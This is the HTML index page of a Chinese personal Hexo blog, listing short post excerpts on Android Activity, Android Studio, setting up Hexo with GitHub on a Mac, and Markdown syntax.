                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-03T08:39:34+08:00">
                2017-02-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>转载原博客地址：<a href="http://blog.csdn.net/gdutxiaoxu/article/details/53576018" target="_blank" rel="external">手把手教你用Hexo+Github 搭建属于自己的博客</a>  </p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/01/22/初探Activity/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/初探Activity/" itemprop="url">
                  初探Activity
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T20:49:38+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h4 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h4><blockquote>
<p> 初探Activity,将一些易忘的点记录下来<br> 开发工具: Android Studio</p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/22/初探Activity/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/01/19/初探Android Studio/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/19/初探Android Studio/" itemprop="url">
                  初探Android Studio
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-19T00:00:08+08:00">
                2017-01-19
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h4 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h4><blockquote>
<p> 初探Android Studio,将一些易忘的点记录下来  </p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/19/初探Android Studio/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/01/17/Mac上搭建Hexo+Github博客/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/17/Mac上搭建Hexo+Github博客/" itemprop="url">
                  Mac上搭建Hexo+Github博客
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-17T14:59:42+08:00">
                2017-01-17
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h4 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h4><blockquote>
<p> 为搭建Hexo博客,踩了不少的坑,终究是搭建成功了,高兴之余记录一下.</p>
<p>  之前买过香港主机,用wp建站,试过之后每隔个1,2月时不时会挂掉,咨询空间商告诉说主机IP受到大规模DDOS攻击,导致不能访问,问题往复几次,个人接受不了,遂放弃.转向Github, 使用Github搭建博客也有好处,最直接的一点就是免费.话不多说,开始记录.  </p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/17/Mac上搭建Hexo+Github博客/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/01/16/MacDown语法/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/16/MacDown语法/" itemprop="url">
                  MacDown语法
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-16T10:08:49+08:00">
                2017-01-16
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><a name="daoyu"></a></p>
<h4 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h4><blockquote>
<p>Markdown 的目标是实现「<strong>易读易写</strong>」.  </p>
<p><strong>Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。</strong>  </p>
<p><strong>Markdown 是一种书写的格式，HTML 是一种发布的格式。</strong></p>
<p>Markdown 的格式语法只涵盖纯文本可以涵盖的范围。不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。</p>
<p>Markdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想不是要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。<strong>Markdown 的理念是，能让文档更容易读写和随意改。</strong></p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/16/MacDown语法/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  

          
          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png"
               alt="yass" />
          <p class="site-author-name" itemprop="name">yass</p>
          <p class="site-description motion-element" itemprop="description">人艰不拆</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">18</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yass</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
